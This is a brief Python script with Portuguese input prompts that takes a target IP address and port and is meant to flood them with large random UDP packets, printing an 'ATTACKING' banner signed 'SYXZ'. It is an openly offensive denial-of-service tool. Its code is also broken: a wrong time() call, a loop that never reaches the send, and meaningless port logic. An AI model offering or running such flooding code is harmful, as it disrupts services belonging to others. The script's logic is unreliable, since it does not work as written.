import os, time, socket, random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout = time.time ()

ip = input ("digite o ip:")
port = int(input("digite a porta:"))

while True:
       while 1:
              if time() > timeout:
                  break
              else:
                  pass
sock.sendto(bytes, (ip, port))
print (" ( + ) ATTACKING SEND BY SYXZ - ")
if port == 6500:
  port = 1
